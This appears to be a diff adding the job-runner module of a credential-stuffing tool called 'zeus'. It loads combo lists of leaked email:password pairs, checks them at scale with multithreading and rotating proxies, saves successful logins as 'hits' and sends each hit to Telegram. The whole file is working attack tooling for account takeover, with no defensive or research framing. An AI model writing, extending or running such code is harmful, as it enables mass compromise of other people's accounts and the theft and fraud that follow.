@@ -1,0 +1,367 @@
+from __future__ import annotations
+
+import random
+import threading
+import time
+from dataclasses import dataclass, field
+from pathlib import Path
+from typing import Any, Iterable
+
+from zeus.checker import _UNSET, check_account, parse_combo
+from zeus.proxy import parse_proxy_lines
+from zeus.telegram_notify import notify_hit
+
+from .combo_store import iter_nonempty_lines
+from .db import (
+    FINAL_STATUSES,
+    combo_key,
+    get_checked_keys,
+    insert_hit,
+    insert_valid,
+    mark_combo_checked,
+)
+
+
+@dataclass
+class JobStats:
+    total: int = 0
+    queued: int = 0
+    skipped: int = 0
+    checked: int = 0
+    hits: int = 0
+    bads: int = 0
+    fails: int = 0
+    errors: int = 0
+    running: bool = False
+    preparing: bool = False
+    stop_requested: bool = False
+    current: str = ""
+    started_at: float | None = None
+    start_line: int = 1
+    rotate_proxy: bool = True
+    logs: list[str] = field(default_factory=list)
+    log_seq: int = 0
+
+
+class CheckerWorker:
+    def __init__(self) -> None:
+        self._lock = threading.Lock()
+        self._thread: threading.Thread | None = None
+        self.stats = JobStats()
+
+    def is_running(self) -> bool:
+        with self._lock:
+            return self.stats.running or self.stats.preparing
+
+    def start(
+        self,
+        *,
+        combo_lines: list[str] | None = None,
+        combo_file: Path | None = None,
+        proxies: list[str],
+        threads: int = 5,
+        start_line: int = 1,
+        rotate_proxy: bool = True,
+    ) -> dict[str, Any]:
+        with self._lock:
+            if self.stats.running or self.stats.preparing:
+                return {"ok": False, "error": "already_running"}
+
+            if not combo_lines and (combo_file is None or not combo_file.exists()):
+                return {"ok": False, "error": "no_combos"}
+
+            parsed_proxies, invalid_proxies = parse_proxy_lines(proxies)
+            prep_logs = ["Preparing combo list..."]
+            if start_line > 1:
+                prep_logs.append(f"Starting from line {start_line:,}")
+            if invalid_proxies:
+                prep_logs.append(
+                    f"Skipped {len(invalid_proxies)} invalid proxy line(s) — use host:port:user:pass"
+                )
+
+            self.stats = JobStats(
+                running=True,
+                preparing=True,
+                start_line=max(1, start_line),
+                rotate_proxy=rotate_proxy,
+                logs=prep_logs,
+            )
+
+        self._thread = threading.Thread(
+            target=self._prepare_and_run,
+            args=(
+                combo_lines,
+                combo_file,
+                parsed_proxies,
+                max(1, threads),
+                max(1, start_line),
+                rotate_proxy,
+            ),
+            daemon=True,
+        )
+        self._thread.start()
+        return {"ok": True, "status": "preparing"}
+
+    def stop(self) -> None:
+        with self._lock:
+            self.stats.stop_requested = True
+
+    def snapshot(self, since_log_seq: int = 0) -> dict[str, Any]:
+        with self._lock:
+            elapsed = 0.0
+            cpm = 0.0
+            if self.stats.started_at:
+                elapsed = max(time.time() - self.stats.started_at, 0.001)
+                cpm = (self.stats.checked / elapsed) * 60.0
+
+            new_logs = []
+            if since_log_seq > 0:
+                if since_log_seq < self.stats.log_seq:
+                    offset = self.stats.log_seq - len(self.stats.logs)
+                    idx = max(0, since_log_seq - offset)
+                    new_logs = self.stats.logs[idx:]
+            else:
+                new_logs = list(self.stats.logs[-200:])
+
+            return {
+                "total": self.stats.total,
+                "queued": self.stats.queued,
+                "skipped": self.stats.skipped,
+                "checked": self.stats.checked,
+                "hits": self.stats.hits,
+                "bads": self.stats.bads,
+                "fails": self.stats.fails,
+                "errors": self.stats.errors,
+                "running": self.stats.running,
+                "preparing": self.stats.preparing,
+                "current": self.stats.current,
+                "start_line": self.stats.start_line,
+                "rotate_proxy": self.stats.rotate_proxy,
+                "log_seq": self.stats.log_seq,
+                "logs": new_logs,
+                "cpm": round(cpm, 1),
+                "elapsed_sec": round(elapsed, 1),
+            }
+
+    def _log(self, message: str) -> None:
+        with self._lock:
+            self.stats.logs.append(message)
+            self.stats.log_seq += 1
+            if len(self.stats.logs) > 2000:
+                self.stats.logs = self.stats.logs[-2000:]
+
+    def _iter_combo_lines(
+        self,
+        combo_lines: list[str] | None,
+        combo_file: Path | None,
+        start_line: int,
+    ) -> Iterable[str]:
+        if combo_lines is not None:
+            if start_line > 1:
+                return combo_lines[start_line - 1 :]
+            return combo_lines
+        if combo_file is not None:
+            return iter_nonempty_lines(combo_file, start_line=start_line)
+        return []
+
+    def _prepare_and_run(
+        self,
+        combo_lines: list[str] | None,
+        combo_file: Path | None,
+        proxies: list[str],
+        threads: int,
+        start_line: int,
+        rotate_proxy: bool,
+    ) -> None:
+        try:
+            checked_keys = get_checked_keys()
+            parsed_combos: list[tuple[str, str]] = []
+            seen_keys: set[str] = set()
+            raw_count = 0
+            skipped_lines = max(0, start_line - 1)
+
+            for line in self._iter_combo_lines(combo_lines, combo_file, start_line):
+                with self._lock:
+                    if self.stats.stop_requested:
+                        return
+
+                raw_count += 1
+                if raw_count % 10000 == 0:
+                    self._log(f"Parsed {raw_count:,} lines...")
+
+                # Support VS-style lines with extra fields after |
+                parsed = parse_combo(line.split("|", 1)[0])
+                if not parsed:
+                    continue
+                email, password = parsed
+                key = combo_key(email, password)
+                if key in seen_keys:
+                    continue
+                seen_keys.add(key)
+                parsed_combos.append(parsed)
+
+            to_run: list[tuple[str, str]] = []
+            skipped = 0
+            for email, password in parsed_combos:
+                key = combo_key(email, password)
+                if key in checked_keys:
+                    skipped += 1
+                else:
+                    to_run.append((email, password))
+
+            with self._lock:
+                self.stats.total = len(parsed_combos) + skipped_lines
+                self.stats.queued = len(to_run)
+                self.stats.skipped = skipped
+                self.stats.preparing = False
+
+            if skipped_lines:
+                self._log(f"Skipped first {skipped_lines:,} line(s) (start line {start_line:,})")
+            if skipped:
+                self._log(f"Resuming — skipped {skipped:,} already-checked combo(s)")
+
+            if not parsed_combos:
+                with self._lock:
+                    self.stats.running = False
+                self._log("No valid combos found")
+                return
+
+            if not to_run:
+                with self._lock:
+                    self.stats.running = False
+                self._log("All combos already checked — nothing to do")
+                return
+
+            with self._lock:
+                self.stats.started_at = time.time()
+
+            rotate_label = "on" if rotate_proxy else "off"
+            self._log(
+                f"Starting — {len(to_run):,} combo(s) queued · {threads} threads · "
+                f"proxy rotate {rotate_label}"
+            )
+            self._run(to_run, proxies, threads, rotate_proxy)
+        except Exception as exc:
+            with self._lock:
+                self.stats.preparing = False
+                self.stats.running = False
+            self._log(f"ERROR | job prep failed | {exc}")
+
+    def _pick_proxy(self, proxies: list[str], index: int) -> str | None:
+        if not proxies:
+            return None
+        if len(proxies) == 1:
+            return proxies[0]
+        return random.choice(proxies)
+
+    def _record_result(self, email: str, password: str, result) -> None:
+        with self._lock:
+            self.stats.checked += 1
+
+        status = result.status.lower()
+        if status in FINAL_STATUSES:
+            mark_combo_checked(email, password, status)
+
+        if result.status == "HIT":
+            line = result.format_line()
+            hit_id = insert_hit(line, email, password, result.to_data())
+            with self._lock:
+                self.stats.hits += 1
+            self._log(line)
+            notify_hit(result)
+            if hit_id is None:
+                self._log(f"DUPLICATE HIT | {email}")
+        elif result.status == "FAIL":
+            line = result.format_line()
+            insert_valid(line, email, password, result.to_data())
+            with self._lock:
+                self.stats.fails += 1
+            self._log(line)
+        elif result.status == "BAD":
+            with self._lock:
+                self.stats.bads += 1
+            self._log(result.format_line())
+        else:
+            with self._lock:
+                self.stats.errors += 1
+            self._log(result.format_line())
+
+    def _run(
+        self,
+        combos: list[tuple[str, str]],
+        proxies: list[str],
+        threads: int,
+        rotate_proxy: bool,
+    ) -> None:
+        from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
+
+        combo_iter = iter(enumerate(combos))
+        inflight: dict = {}
+        max_inflight = max(threads * 2, threads)
+
+        def task(idx: int, email: str, password: str):
+            with self._lock:
+                if self.stats.stop_requested:
+                    return None
+                self.stats.current = email
+
+            proxy = self._pick_proxy(proxies, idx) if proxies else _UNSET
+            return check_account(
+                email,
+                password,
+                proxy=proxy,
+                rotate_proxy=rotate_proxy,
+                timeout=45,
+            )
+
+        def submit_next(pool) -> bool:
+            with self._lock:
+                if self.stats.stop_requested:
+                    return False
+            try:
+                idx, (email, password) = next(combo_iter)
+            except StopIteration:
+                return False
+            future = pool.submit(task, idx, email, password)
+            inflight[future] = (email, password)
+            return True
+
+        try:
+            with ThreadPoolExecutor(max_workers=threads) as pool:
+                for _ in range(min(max_inflight, len(combos))):
+                    if not submit_next(pool):
+                        break
+
+                while inflight:
+                    done, _ = wait(inflight, return_when=FIRST_COMPLETED)
+                    for future in done:
+                        email, password = inflight.pop(future)
+                        try:
+                            result = future.result()
+                        except Exception as exc:
+                            with self._lock:
+                                self.stats.checked += 1
+                                self.stats.errors += 1
+                            self._log(f"ERROR | {email} | {exc}")
+                        else:
+                            if result is not None:
+                                self._record_result(email, password, result)
+
+                        submit_next(pool)
+
+                    with self._lock:
+                        if self.stats.stop_requested:
+                            for pending in inflight:
+                                pending.cancel()
+                            inflight.clear()
+                            break
+        finally:
+            with self._lock:
+                self.stats.running = False
+                self.stats.preparing = False
+                self.stats.stop_requested = False
+                self.stats.current = ""
+            self._log("Job finished")
+
+
+worker = CheckerWorker()
